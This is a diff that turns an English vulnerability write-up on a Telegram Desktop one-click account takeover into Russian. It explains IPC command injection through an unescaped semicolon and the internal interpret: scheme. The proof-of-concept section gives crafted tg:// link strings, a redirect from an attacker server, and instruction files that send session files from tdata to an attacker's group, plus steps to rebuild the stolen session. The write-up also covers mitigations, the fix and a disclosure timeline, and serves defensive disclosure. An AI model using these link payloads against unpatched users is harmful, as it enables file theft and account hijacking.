@@ -1,71 +1,55 @@
 ---
-title: "EN: Telegram Desktop: one-click account takeover via IPC injection"
+title: "Telegram Desktop: захват аккаунта одним кликом через инъекцию IPC-команд"
 date: 2026-10-03 10:00:00+0200
 categories: [Research]
 tags: [telegram, high, command-injection, account-takeover, arbitrary-file-read]
-description: An unescaped separator in Telegram Desktop's single-instance IPC lets one clicked link read arbitrary files off the disk and send them to the attacker, session files included.
+description: "Неэкранированный разделитель в IPC-механизме Telegram Desktop для единственного экземпляра приложения позволяет с помощью одного клика по ссылке прочитать произвольные файлы с диска и отправить их злоумышленнику, включая файлы сессии."
 cover: /img/telegram-desktop-one-click-account-takeover/cover.svg
 ---
 
 ![](/img/telegram-desktop-one-click-account-takeover/image.svg)
-## Introduction
-Someone adds you to a Telegram group. A link shows up in the chat. You click it, and your Telegram
-account is no longer only yours.
 
-How?
-Telegram Desktop hands clicked links to its own already-running instance over a local socket, as
-text, and never escapes the character it uses to separate commands. So a crafted link does not
-arrive as one instruction: it arrives as several.
+## Введение
 
-The chain I found has two defects. The first is that injection. The second is what the injected
-command reaches: an internal URI scheme, `interpret:`, that reads a file named in an instruction
-file and sends it to a chat, without checking who asked for it and without a confirmation. Together
-they turn a clicked link into arbitrary file read. In this post I walk through the chain and then
-use it to steal the files that are the victim's login.
+Кто-то добавляет вас в группу Telegram. В чате появляется ссылка. Вы нажимаете на неё — и теперь доступ к вашему аккаунту есть не только у вас.
 
+Как это возможно?
+
+Telegram Desktop передаёт открываемые ссылки своему уже запущенному экземпляру через локальный сокет в виде текста, но не экранирует символ, которым разделяются команды. Поэтому специально сформированная ссылка воспринимается не как одна инструкция, а как несколько.
+
+Обнаруженная мной цепочка состоит из двух уязвимостей. Первая — эта инъекция. Вторая связана с тем, куда ведёт внедрённая команда: внутренней URI-схемой `interpret:`, которая читает файл, указанный в файле инструкций, и отправляет его в чат без проверки инициатора и без подтверждения. Вместе эти недостатки позволяют превратить один клик по ссылке в произвольное чтение файлов. В статье я разберу всю цепочку и покажу, как с её помощью можно похитить файлы, обеспечивающие авторизацию жертвы.
+
+| Параметр | Значение |
 |---|---|
-| **Affected** | Telegram Desktop through 7.2.8, confirmed on Windows (6.9.3) |
-| **Impact** | Remote arbitrary local file read, exfiltrated to an attacker-controlled chat; account takeover |
+| **Затронутые версии** | Telegram Desktop до 7.2.8 включительно; подтверждено на Windows (6.9.3) |
+| **Последствия** | Удалённое чтение произвольных локальных файлов с их отправкой в подконтрольный злоумышленнику чат; захват аккаунта |
 | **CVE** | [CVE-2026-107181](https://www.cve.org/CVERecord?id=CVE-2026-107181) |
-| **Fixed in** | 7.2.9, commit [`db3405699f`](https://github.com/telegramdesktop/tdesktop/commit/db3405699f8fc3ae28a58d2348b7d13a43c0590a) |
-| **Severity** | 8.1 High, `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` |
+| **Исправлено в** | 7.2.9, коммит [`db3405699f`](https://github.com/telegramdesktop/tdesktop/commit/db3405699f8fc3ae28a58d2348b7d13a43c0590a) |
+| **Критичность** | 8.1 — высокая, `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` |
 
-## One link, two processes
+## Одна ссылка, два процесса
 
-Operating systems let programs register a URI scheme, so they know which application to launch when
-they meet a link of that kind. Telegram Desktop registers `tg`. From then on the system knows a
-`tg://...` link belongs to Telegram, and launches it with the URL as a command-line argument.
+Операционные системы позволяют программам регистрировать URI-схемы, чтобы определять, какое приложение запускать при переходе по определённым ссылкам. Telegram Desktop регистрирует схему `tg`. После этого система знает, что ссылка `tg://...` предназначена Telegram, и запускает приложение, передавая URL как аргумент командной строки.
 
-If Telegram is not running, the process starts, takes the string as a parameter, turns it into a URL
-object and handles it internally: one process, and nothing to communicate.
+Если Telegram ещё не запущен, процесс стартует, принимает строку в качестве параметра, преобразует её в объект URL и обрабатывает внутри приложения. Один процесс — передавать ничего не требуется.
 
-But what if Telegram is already running? The operating system neither knows nor checks: it launches
-a new process anyway, identical to the first. Telegram itself has to work out that it is the
-redundant one, and the way it works that out is by trying to connect to a local socket.
+А что, если Telegram уже работает? Операционная система этого не знает и не проверяет: она всё равно запускает второй процесс, идентичный первому. Telegram должен самостоятельно определить, что новый экземпляр лишний. Для этого он пытается подключиться к локальному сокету.
 
-The already-running instance is the server: it has been listening on that socket since it started.
-The new process is the client. If it manages to connect, an instance is already alive, so it hands
-over the link and exits.
+Уже запущенный экземпляр выступает сервером: он слушает этот сокет с момента запуска. Новый процесс — клиент. Если ему удаётся подключиться, значит, экземпляр приложения уже существует. Тогда он передаёт ссылку работающему процессу и завершает работу.
 
-A socket does not carry objects, it carries bytes. The URL object the new process holds in memory
-cannot cross that channel, so it has to be flattened into a line of text.
+Сокет передаёт не объекты, а байты. Объект URL, находящийся в памяти нового процесса, нельзя непосредственно переслать по этому каналу, поэтому его необходимо преобразовать в текстовую строку.
 
-That operation has a name: serialization. Its inverse, rebuilding the object from the text, is
-deserialization. Both are unavoidable whenever structured data has to cross a boundary, and both are
-the exact point where the boundaries inside the data stop being held by the structure and become
-characters in the text.
+Этот процесс называется **сериализацией**. Обратная операция — восстановление объекта из текста — называется **десериализацией**. Они необходимы при передаче структурированных данных через границу между процессами. Именно в этот момент границы между элементами данных перестают задаваться структурой и превращаются в обычные символы текста.
 
-Telegram does it with a format of its own, a simple one. Each instruction is a keyword, then its
-argument, then a semicolon that closes it. A link to open becomes:
+Telegram использует собственный, довольно простой формат. Каждая инструкция состоит из ключевого слова, аргумента и завершающей точки с запятой. Команда открытия ссылки выглядит так:
 
 ```text
 OPEN:tg://x?a=1;
 ```
 
-`tg://x?a=1` matches no handler inside Telegram, so on its own that link does nothing. It is only a
-carrier.
+Для `tg://x?a=1` в Telegram нет подходящего обработчика, поэтому сама по себе эта ссылка ничего не делает. Она лишь служит носителем.
 
-That line is built here, one per URL to open:
+Такая строка формируется здесь, по одной на каждый открываемый URL:
 
 ```cpp
 // sandbox.cpp:295-297
@@ -74,13 +58,10 @@ for (const auto &url : cRefStartUrls()) {
 }
 ```
 
-On the other side the running instance deserializes: it reads the received bytes, cuts them at every
-semicolon, and treats each piece as an instruction in its own right. For each piece starting with
-`OPEN:` it takes what follows and rebuilds it as a URL, exactly as if it had just arrived on the
-command line.
+На принимающей стороне работающий экземпляр выполняет десериализацию: читает полученные байты, разбивает строку по каждой точке с запятой и считает каждый фрагмент самостоятельной инструкцией. Для фрагментов, начинающихся с `OPEN:`, он извлекает оставшуюся часть и снова преобразует её в URL — точно так же, как если бы ссылка только что поступила через командную строку.
 
 ```cpp
-// sandbox.cpp:453-463 (abbreviated)
+// sandbox.cpp:453-463 (сокращено)
 for (int32 to = cmds.indexOf(QChar(';'), from); to >= from; ...) {
     auto cmd = base::StringViewMid(cmds, from, to - from);
     ...
@@ -88,64 +69,56 @@ for (int32 to = cmds.indexOf(QChar(';'), from); to >= from; ...) {
         startUrls.append(cmds.mid(from + 5, to - from - 5).mid(0, 8192));
 ```
 
-## The unescaped separator
+## Неэкранированный разделитель
 
-So what happens if one of the transmitted values contains a semicolon of its own, the very character
-the format uses as a separator? Take the link from before and add something to it:
+Что произойдёт, если передаваемое значение само содержит точку с запятой — тот самый символ, который формат использует как разделитель? Возьмём предыдущую ссылку и добавим к ней ещё кое-что:
 
 ```text
 tg://x?a=1;CMD:quit
 ```
 
-The new process treats it as a single URL, because to it that semicolon is just a character inside
-the query. It flattens it and writes it to the socket:
+Новый процесс воспринимает это как единый URL, поскольку для него точка с запятой — лишь символ внутри строки запроса. Он сериализует URL и отправляет его в сокет:
 
 ```text
 OPEN:tg://x?a=1;CMD:quit;
 ```
 
-The running instance cuts at every semicolon and gets two instructions instead of one:
+Работающий экземпляр разбивает строку по каждой точке с запятой и вместо одной инструкции получает две:
 
 ```text
 OPEN:tg://x?a=1
 CMD:quit
 ```
 
-That is the injection, and it is the first of the two defects.
+Это и есть инъекция — первая из двух уязвимостей.
 
-## The interpret: URI scheme
+## URI-схема `interpret:`
 
-The example above injected `CMD:`, but don't be misled by the name: it accepts only `show` and
-`quit`, so the worst it can do is close the app.
+В предыдущем примере внедрялась команда `CMD:`, но название может ввести в заблуждение: она принимает только `show` и `quit`, так что максимум, чего можно добиться с её помощью, — закрыть приложение.
 
-Four commands are accepted in total, and three of them are harmless. The fourth is `OPEN:`, and
-there is the detail: it accepts any URL, with no filter on the scheme.
+Всего поддерживаются четыре команды, и три из них безвредны. Четвёртая — `OPEN:`. Важная деталь: она принимает любой URL, не фильтруя URI-схему.
 
-Digging through the code turns up another URI scheme inside Telegram, called `interpret:`.
+При изучении кода обнаруживается ещё одна внутренняя URI-схема Telegram — `interpret:`.
 
-The operating system would not know what to do with a link starting with `interpret:`, because it is
-registered nowhere as a protocol handler: it exists only inside Telegram's own code, which picks the
-scheme up off the start-URL list like any other.
+Операционная система не знает, что делать со ссылкой, начинающейся с `interpret:`, потому что эта схема нигде не зарегистрирована как обработчик протокола. Она существует исключительно во внутреннем коде Telegram, который извлекает её из списка стартовых URL, как и остальные.
 
 ```cpp
 // application.cpp:1162-1164
 if (url.scheme() == u"interpret"_q) {
     interprets.append(url.path());
     return false;
+}
 ```
 
-Through `OPEN:`, then, it is reachable:
+Следовательно, до неё можно добраться через `OPEN:`:
 
 ```text
 tg://x?a=1;OPEN:interpret:instructions.txt
 ```
 
-So what is `interpret:` for?
+Для чего нужна `interpret:`?
 
-It was the tool Telegram used to publish its own releases. When a new version shipped, the build
-archive had to be posted to a channel with the changelog as its caption. Rather than doing that by
-hand, a script wrote a small text file naming the channel, the file to send and the text to write,
-then launched Telegram with the path to that file.
+Telegram использовал её как инструмент публикации собственных релизов. При выходе новой версии архив сборки нужно было разместить в канале, добавив список изменений в подпись. Чтобы не делать это вручную, скрипт создавал небольшой текстовый файл с названием канала, путём к отправляемому файлу и текстом сообщения, после чего запускал Telegram с путём к этому файлу.
 
 ```python
 # Telegram/build/updates.py:206
@@ -153,7 +126,7 @@ subprocess.call(... 'Telegram -sendpath interpret://' + scriptPath
     + '/.../command.txt', shell=True)
 ```
 
-The instruction file looks like this:
+Файл инструкций выглядит так:
 
 ```text
 from: 1234567890
@@ -165,17 +138,13 @@ caption: TDesktop at 12.06.26:
 - Added a new sticker pack.
 ```
 
-The value of `from:` is compared against the id of the currently logged-in account: it keeps an
-operator from publishing a release from the wrong one. The check only runs if the line is present,
-so leaving it out skips it. The destination is set only by `channel:`, and has to be a channel or a
-supergroup.
+Значение `from:` сравнивается с идентификатором текущего авторизованного аккаунта, чтобы оператор случайно не опубликовал релиз не из того аккаунта. Но проверка выполняется только при наличии соответствующей строки: если её убрать, проверки не будет. Получатель определяется исключительно полем `channel:` и должен быть каналом или супергруппой.
 
-A function called `InterpretSendPath` does the work.
+Основную работу выполняет функция `InterpretSendPath`.
 
-So where is the bug? `interpret:` performs a privileged action, reading any file off the disk and
-sending it to a chat, without asking anyone for confirmation and without checking who asked for it.
+В чём же ошибка? `interpret:` выполняет привилегированное действие: читает произвольный файл с диска и отправляет его в чат, не запрашивая подтверждения и не проверяя, кто инициировал операцию.
 
-The function performs no authorization check.
+Функция вообще не выполняет проверку авторизации.
 
 ```cpp
 // support_helper.cpp:673-680
@@ -189,55 +158,35 @@ QString InterpretSendPath(
     const auto content = QString::fromUtf8(f.readAll());
 ```
 
-When that comes from the command line, which is how the release script invokes it, it is not a
-problem: an attacker would need a foothold on the machine already, and with one they can read the
-files themselves. But once the same action is reachable through the socket, and therefore through
-the injection, a dangerous function becomes available from a link the victim clicks.
+Когда команда поступает через командную строку, как в скрипте публикации релизов, это не проблема: злоумышленнику уже нужен доступ к компьютеру, а при таком доступе он мог бы прочитать файлы самостоятельно. Но когда та же операция становится доступной через сокет и, следовательно, через инъекцию, опасную функцию можно вызвать одним нажатием жертвы на ссылку.
 
-That is a missing authorization, and it is the second of the two defects.
+Таким образом, **отсутствие проверки авторизации** — вторая уязвимость.
 
-## Getting the instruction file onto disk
+## Как разместить файл инструкций на диске
 
-An attacker who could place an instruction file on the victim's disk, pointing `file:` at a path
-worth stealing and `channel:` at a channel of their own, could exfiltrate any file from that machine
-with nothing more than a clicked link.
+Если злоумышленник может поместить на диск жертвы файл инструкций, указав в `file:` путь к интересующему его файлу, а в `channel:` — свой канал, он сможет похитить любой файл с компьютера всего лишь после клика по ссылке.
 
-So how does an attacker place a text file at a predictable path on someone else's disk? The obvious
-way is to send it as a chat attachment.
+Но как поместить текстовый файл в предсказуемое место на чужом диске? Очевидный способ — отправить его вложением в чат.
 
-As it happens, Telegram Desktop in its default configuration downloads files received in groups up
-to 8 MiB automatically, while in broadcast channels automatic download is off. The file lands in a
-standard folder, under the same name the sender chose, without the victim clicking on it, and in a
-predictable place (a name collision would make Telegram save `instructions1 (2).txt` instead). Some
-formats, such as stickers, GIFs and voice messages, go to an internal cache instead and would not be
-reachable as a path on disk.
+Оказывается, в стандартной конфигурации Telegram Desktop автоматически скачивает файлы размером до 8 МиБ, полученные в группах. В каналах с односторонней публикацией автоматическая загрузка отключена. Файл попадает в стандартную папку под именем, заданным отправителем, без необходимости открывать его вручную, причём расположение предсказуемо. Если имя уже занято, Telegram сохранит файл, например, как `instructions1 (2).txt`. Некоторые форматы — стикеры, GIF и голосовые сообщения — отправляются во внутренний кеш, поэтому обратиться к ним по обычному пути на диске не получится.
 
-Telegram builds that path itself (`file_utilities.cpp:172-181`). On Windows:
+Telegram формирует путь самостоятельно (`file_utilities.cpp:172-181`). В Windows он выглядит так:
 
 ```text
 C:\Users\<user>\Downloads\Telegram Desktop\<file name>
 ```
 
-By sending the file into the group, the attacker knows exactly where it will be saved. The path
-still seems to hold one unknown, the Windows user name, but `interpret:` also accepts relative
-paths, and a relative path is resolved from Telegram's own working directory, which is its data
-folder (`logs.cpp:381`). On Windows that is `%APPDATA%\Telegram Desktop`, three levels below the
-user's home directory, and `Downloads` sits directly in that home directory. So a path like this
-one:
+Отправив файл в группу, злоумышленник знает, где именно он будет сохранён. На первый взгляд остаётся неизвестным имя пользователя Windows. Но `interpret:` также принимает относительные пути. Они вычисляются относительно рабочего каталога Telegram — его папки данных (`logs.cpp:381`). В Windows это `%APPDATA%\Telegram Desktop`, то есть каталог, находящийся на три уровня ниже домашней папки пользователя. Папка `Downloads` расположена непосредственно в домашней папке. Поэтому можно использовать такой путь:
 
 ```text
 interpret:../../../Downloads/Telegram%20Desktop/instructions.txt
 ```
 
-gives the attacker a deterministic path without ever needing the user name.
+Он однозначно указывает расположение файла, даже если имя пользователя неизвестно.
 
-## From file read to account takeover
+## От чтения файлов к захвату аккаунта
 
-`InterpretSendPath` sends exactly one file per invocation: if an instruction file holds several
-`file:` lines, only the last one counts. Two things lift that limit. Nothing stops an attacker from
-posting as many instruction files as they want, and the injection does not stop at the first
-command: every semicolon opens another. Three targets, then, are three instruction files and three
-stacked commands in one link.
+`InterpretSendPath` отправляет ровно один файл за вызов: если в файле инструкций указано несколько строк `file:`, учитывается только последняя. Но это ограничение можно обойти по двум причинам. Ничто не мешает злоумышленнику разместить несколько файлов инструкций, а инъекция не ограничивается одной командой: каждая точка с запятой начинает следующую. Поэтому для трёх целей можно использовать три файла инструкций и три последовательные команды в одной ссылке.
 
 ```text
 tg://x?a=1
@@ -246,70 +195,48 @@ tg://x?a=1
   ;OPEN:interpret:../../../Downloads/Telegram%20Desktop/instructions3.txt
 ```
 
-The primitive stays the same throughout: arbitrary file read. What changes is what you read: an SSH
-private key, a browser password store, a cloud credentials file, or a configuration holding an API
-token.
+Механизм атаки не меняется: произвольное чтение файлов. Меняется только содержимое: закрытый SSH-ключ, хранилище паролей браузера, файл учётных данных облачного сервиса или конфигурация с API-токеном.
 
-Telegram does not keep local data in the clear, so everything the user holds on disk is encrypted,
-including the session authorization. That is the key the client uses to identify itself to
-Telegram's servers, and holding it is enough to be that account, much like a session cookie on a
-website.
+Telegram не хранит локальные данные в открытом виде. Всё, что находится у пользователя на диске, зашифровано, включая данные авторизации сессии. Это ключ, по которому клиент идентифицирует себя перед серверами Telegram. Обладания им достаточно, чтобы действовать от имени аккаунта, подобно сессионному cookie на сайте.
 
-Telegram uses key wrapping. Two keys are involved. The first, the DEK (Data Encryption Key), is
-long, random and high-entropy, and encrypts the user's data. The second, the KEK (Key Encryption
-Key), encrypts only the DEK, and is not the password: it is derived from the password through a key
-derivation function (KDF), together with a salt stored next to the encrypted DEK.
+Telegram использует **обёртывание ключей** (key wrapping). Участвуют два ключа. Первый — DEK (Data Encryption Key), длинный случайный ключ с высокой энтропией, шифрующий данные пользователя. Второй — KEK (Key Encryption Key), который шифрует только DEK. Сам KEK не является паролем: он выводится из пароля с помощью функции формирования ключа (KDF) и соли, хранящейся рядом с зашифрованным DEK.
 
-In pseudocode, the chain that opens the local data looks like this:
+В псевдокоде процесс расшифровки локальных данных выглядит так:
 
 ```python
 salt, encrypted_DEK = read("tdata/key_datas")
-passcode            = user_passcode()          # empty if none is set
+passcode            = user_passcode()          # пустая строка, если код-пароль не установлен
 
 KEK     = KDF(passcode, salt)
 DEK     = decrypt(encrypted_DEK, KEK)
 session = decrypt(authorization_file, DEK)
 ```
 
-By default Telegram Desktop has no local passcode: you have to open the settings and set one. With
-none set, the password feeding the derivation is empty (`storage_domain.cpp:102`), so the KEK comes
-from the empty string and a salt, and that salt is stored in the clear in `tdata/key_datas`, the
-same file that holds the encrypted DEK. Reading that one file is enough to recompute the KEK and
-unwrap the DEK.
+По умолчанию в Telegram Desktop нет локального код-пароля: его необходимо самостоятельно включить в настройках. Если он не задан, при формировании ключа используется пустой пароль (`storage_domain.cpp:102`). Таким образом, KEK получается из пустой строки и соли, а соль в открытом виде хранится в `tdata/key_datas`, рядом с зашифрованным DEK. Прочитав этот файл, можно заново вычислить KEK и расшифровать DEK.
 
-So with no passcode set, whoever gets `key_datas` gets the DEK, and with the DEK everything else
-decrypts, session authorization included.
+Следовательно, если код-пароль не задан, обладатель `key_datas` получает доступ к DEK, а с ним — возможность расшифровать остальные данные, включая авторизацию сессии.
 
-Three files are involved, and only two of them hold secrets:
+В процессе участвуют три файла, и только два из них содержат секретные данные:
 
 ```text
 tdata/
-├── key_datas                 the salt and the encrypted DEK
-├── D877F783D5D3EF8Cs         the MTProto authorization, encrypted with the DEK
+├── key_datas                 соль и зашифрованный DEK
+├── D877F783D5D3EF8Cs        авторизация MTProto, зашифрованная с помощью DEK
 └── D877F783D5D3EF8C/
-    └── maps                  the index of the account's stored data
+    └── maps                  индекс сохранённых данных аккаунта
 ```
 
-That folder name is not random and not specific to an installation. It is derived from the string
-`data`, the default data name (`storage_file_utilities.cpp:241-250`). It is identical on every
-install.
+Название этой папки не случайно и не уникально для установки. Оно получается из строки `data` — стандартного имени данных (`storage_file_utilities.cpp:241-250`) — и одинаково во всех установках.
 
-The third file is an index, and it holds no secrets. The session still will not load without it:
-Telegram reads the authorization only while reading that index. Stealing it, though, is a choice: an
-attacker could just as well build one. In this proof of concept it is simply taken along with the
-other two, for convenience.
+Третий файл — индекс, в нём нет секретов. Однако без него сессия всё равно не загрузится: Telegram читает данные авторизации только во время чтения индекса. При этом красть индекс необязательно: злоумышленник может создать его самостоятельно. В данном доказательстве концепции он просто забирается вместе с двумя другими файлами для удобства.
 
-It follows that an attacker holding all three has the account: drop them into a fresh `tdata`, start
-Telegram, and the victim's session opens.
+Получается, что злоумышленник, располагающий всеми тремя файлами, получает доступ к аккаунту: достаточно поместить их в новый каталог `tdata`, запустить Telegram — и откроется сессия жертвы.
 
-## Delivering the link
+## Доставка ссылки
 
-The attack needs one click from the victim, and it has to come from outside Telegram. A `tg://` link
-clicked inside a Telegram chat is handled in-process (`click_handler_types.cpp:278`) and never
-reaches the socket, so there is nothing to inject into. Normal `https` links, on the other hand,
-open in the system browser (`ui_integration.cpp:437`), because Telegram Desktop has no embedded one.
-So the attacker sends an ordinary `https` link and has their own server redirect it to the crafted
-`tg://` one.
+Для атаки требуется один клик со стороны жертвы, причём ссылка должна открываться **за пределами Telegram**. Ссылка `tg://`, по которой нажали прямо внутри чата Telegram, обрабатывается в текущем процессе (`click_handler_types.cpp:278`) и не проходит через сокет. Следовательно, внедрить команду таким способом нельзя. Обычные ссылки `https`, напротив, открываются в системном браузере (`ui_integration.cpp:437`), поскольку в Telegram Desktop нет встроенного браузера.
+
+Поэтому злоумышленник отправляет обычную `https`-ссылку, а его сервер перенаправляет её на специально подготовленный адрес `tg://`.
 
 ```http
 GET /rules HTTP/1.1
@@ -319,17 +246,13 @@ HTTP/1.1 302 Found
 Location: tg://x?a=1;OPEN:interpret:instructions.txt
 ```
 
-Depending on the browser, and on whether the victim has used the handler before, the system may ask
-for confirmation before launching Telegram.
+В зависимости от браузера и от того, использовался ли этот обработчик ранее, система может запросить подтверждение запуска Telegram.
 
-## Proof of concept
+## Доказательство концепции (PoC)
 
-1. The attacker creates a supergroup and adds the victim to it. Telegram's default privacy
-   setting allows this with no confirmation from the invitee.
+1. Злоумышленник создаёт супергруппу и добавляет туда жертву. Стандартные настройки приватности Telegram допускают это без подтверждения со стороны приглашённого пользователя.
 
-2. The attacker posts three instruction text files in the group, one for each file to be stolen, all
-   naming the attacker's own group as the destination. Omitting the `from:` line skips the account
-   check entirely:
+2. Злоумышленник размещает в группе три текстовых файла инструкций — по одному на каждый файл, который требуется похитить. Во всех указан адрес его собственной группы. Если убрать строку `from:`, проверка аккаунта полностью пропускается:
 
    ```text
    channel: 2001234567
@@ -337,19 +260,15 @@ for confirmation before launching Telegram.
    caption: poc
    ```
 
-   The file has to be plain text with LF line endings and no byte-order mark. The other two point at
-   `tdata/D877F783D5D3EF8Cs` and `tdata/D877F783D5D3EF8C/maps`. Automatic download saves all three
-   to the victim's disk when the victim opens the group, which they do anyway, because that is where
-   the link in step 3 is waiting.
+   Файл должен быть обычным текстом с переводами строк LF и без маркера порядка байтов (BOM). Два других файла указывают на `tdata/D877F783D5D3EF8Cs` и `tdata/D877F783D5D3EF8C/maps`. Автоматическая загрузка сохраняет все три файла на диск жертвы, когда она открывает группу. Она всё равно откроет её, поскольку именно там находится ссылка из третьего шага.
 
-3. The attacker sends an innocuous link into the chat:
+3. Злоумышленник отправляет в чат безобидную на вид ссылку:
 
    ```text
    https://corvus.sec/rules
    ```
 
-4. The victim clicks it. The browser follows the redirect, which this time carries one command per
-   target, wrapped here but sent as a single line:
+4. Жертва нажимает на ссылку. Браузер выполняет перенаправление; на этот раз оно содержит отдельную команду для каждого целевого файла. Ниже команды перенесены на несколько строк для удобства чтения, но передаются единой строкой:
 
    ```text
    tg://x?a=1
@@ -358,51 +277,37 @@ for confirmation before launching Telegram.
      ;OPEN:interpret:../../../Downloads/Telegram%20Desktop/instructions3.txt
    ```
 
-5. The operating system launches a second Telegram process, which forwards the URL to the running
-   one over the socket. The unescaped semicolons split it, and the injection fires.
+5. Операционная система запускает второй процесс Telegram. Тот пересылает URL уже работающему экземпляру через сокет. Неэкранированные точки с запятой разбивают строку на отдельные команды, и инъекция срабатывает.
 
-6. The three `interpret:` commands execute, and the three files are uploaded to the attacker's
-   group. No confirmation dialog is shown.
+6. Выполняются три команды `interpret:`, и три файла загружаются в группу злоумышленника. Никакого диалога подтверждения не появляется.
 
-7. The attacker rebuilds `tdata` from the three files and opens the victim's account.
+7. Злоумышленник восстанавливает каталог `tdata` из трёх файлов и открывает аккаунт жертвы.
 
-## Mitigations
+## Меры защиты
 
-**Upgrade to 7.2.9 or later.** That is the only thing that actually closes the problem. The rest
-reduces exposure.
+**Обновите Telegram Desktop до версии 7.2.9 или новее.** Это единственный способ полностью устранить описанную проблему. Остальные меры лишь уменьшают вероятность атаки.
 
-- **Turn on "ask where to save each file".** With that setting, automatic download does not happen
-  at all, and the instruction file never reaches the disk. It is the most effective mitigation short
-  of upgrading.
+- **Включите настройку «Спрашивать, куда сохранять каждый файл».** При такой настройке автоматическая загрузка вообще не происходит, поэтому файл инструкций не попадает на диск. Это наиболее эффективная мера, если обновление пока невозможно.
+- **Разрешите добавлять вас в группы только контактам.** Похищенные файлы можно отправить лишь в канал или супергруппу, а эта настройка лишает злоумышленника возможности беспрепятственно создать место их доставки.
+- **Установите локальный код-пароль и выбирайте его как полноценный пароль.** Он не предотвращает кражу файлов, но делает похищенную сессию непригодной для использования.
 
-- **Limit who can add you to groups to your contacts only.** Stolen files can only be sent to a
-  channel or a supergroup, so this takes away the place the attacker would have them delivered to.
+## Исправление
 
-- **Set a local passcode, and choose it like a real password.** It does not prevent the files from
-  being stolen; it only makes the stolen session unusable.
+Уязвимость исправлена коммитом `db3405699f` от 16 сентября 2026 года. В журнале изменений версия 7.2.9 датирована тем же днём, хотя релиз был опубликован следующим утром.
 
-## Fix
+Коммит полностью удаляет схему `interpret://` и функцию `Support::InterpretSendPath`, а также вводит экранирование разделителя записей в сокете механизма единственного экземпляра. Перед отправкой значения кодируются шестнадцатеричной последовательностью с префиксом `%`, а после разделения декодируются. Благодаря этому точка с запятой внутри данных больше не может превратиться в границу между командами.
 
-Fixed by commit `db3405699f` on 16 September 2026. The changelog dates 7.2.9 to the same day; the
-release was published the following morning. The commit removes the `interpret://` scheme and
-`Support::InterpretSendPath` entirely, and escapes the record separator on the single-instance
-socket: values are escaped with a percent-prefixed hex encoding before being written and decoded
-after the split, so a semicolon in the data can no longer become a boundary.
+Кроме того, добавлены ещё две защитные меры: записи `CMD:` и `CTRL:` игнорируются, если в том же соединении присутствует `OPEN:`, а пути к локальным файлам отбрасываются, если ранее в этом соединении появился нелокальный URL.
 
-It also adds two measures beyond that: `CMD:` and `CTRL:` records are skipped when the same
-connection carries an `OPEN:`, and local file paths are dropped once a non-local URL has appeared on
-that connection.
+## Хронология
 
-## Timeline
-
-| Date | Event |
+| Дата | Событие |
 |---|---|
-| 2026-06-25 | Reported through ZDI |
-| 2026-09-16 | Vendor fixes the issue independently, commit `db3405699f` |
-| 2026-09-17 | Telegram Desktop 7.2.9 published |
-| 2026-09-30 | ZDI closes the case as already fixed; disclosure rights return to me |
-| 2026-10-03 | This writeup |
-| 2026-10-07 | CVE-2026-107181 assigned |
+| 2026-06-25 | Об уязвимости сообщено через ZDI |
+| 2026-09-16 | Разработчик самостоятельно устраняет проблему, коммит `db3405699f` |
+| 2026-09-17 | Опубликован Telegram Desktop 7.2.9 |
+| 2026-09-30 | ZDI закрывает дело как уже исправленное; право на раскрытие информации возвращается автору |
+| 2026-10-03 | Опубликована эта статья |
+| 2026-10-07 | Присвоен идентификатор CVE-2026-107181 |
 
-The fix shipped quietly: the 7.2.9 changelog mentions only a rendering fix, the commit that closes
-the chain is titled "Remove legacy interpret path helper", and no advisory accompanied it.
+Исправление вышло практически незаметно: в журнале изменений 7.2.9 упоминается только исправление рендеринга, коммит, устраняющий всю цепочку атаки, называется «Remove legacy interpret path helper», и отдельного уведомления о безопасности не публиковалось.
